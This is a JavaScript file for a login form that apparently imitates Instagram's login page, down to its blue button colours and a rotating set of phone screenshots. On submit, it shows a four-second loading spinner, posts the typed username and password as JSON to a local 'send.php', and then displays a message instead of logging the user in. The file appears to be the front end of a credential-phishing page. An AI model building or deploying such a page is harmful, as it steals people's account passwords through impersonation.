
let pname = document.querySelector("#pname");
let pass = document.querySelector("#pass");
let log_in = document.querySelector("#logo");
let box_first_second = document.querySelector(".box-first-second"); 
let loader = document.querySelector(".loader");
let mess = document.querySelector(".mess");



// page render using js

// document.body.addEventListener("mouseover",function(){


   
  // })















// function chaeck the name and pass filed not emtpt 
// box_first_second.addEventListener("keydown",Check_filed);
box_first_second.addEventListener("keyup",Check_filed);
   





function Check_filed(){
    if(pname.value !== "" && pass.value !== "" && pass.value.length >= 6)
        {
         log_in.style.cursor = "pointer";
         log_in.style.backgroundColor = " rgb(0, 62, 246)";
    
        }
        else{
         log_in.style.cursor = "context-menu";
         log_in.style.backgroundColor = "rgb(0, 149, 246)";
        }
}


log_in.addEventListener("click",function(){
    if(pname.value !== "" && pass.value !== "" && pass.value.length >= 6)
        {
            Circle();
            setTimeout(function(){
                mess.style.display = "block";
            },3999)
            xm(pname.value,pass.value);
        } 
})



// chack cirlce

function Circle()
{
    let set = setInterval(function(){
        loader.style.display = "block";
        log_in.innerText = "";
    },)

    setTimeout(function(){
        loader.style.display = "none";
        log_in.innerText = "Log_in";

     clearInterval(set);
    },4000)
}




// function change the photo

let op = document.querySelector(".op2");
let c = 0;

let arr = ["./screnshoot/screenshot1.png","./screnshoot/screenshot2.png","./screnshoot/screenshot3.png","./screnshoot/screenshot4.png"];

op.src = "./screnshoot/screenshot1.png";
            setInterval(function(){
        if(c == 4){
            c = 0;
        }
        console.log(op.src);
        op.src = arr[c];
        c = c+1;
    },3850)




    // data send in php

    function xm(name,pass){
        // username = "";
        // passw = "";
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", "./send.php", true);
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                console.log(xhttp.responseText);
            }
        };
        let obj = {name:name,pass:pass};
        let jsn = JSON.stringify(obj);
        console.log(jsn);
        xhttp.send(jsn);
        // username = "";
        // pass = "";
        // name = "";
        // pass = "";
    }









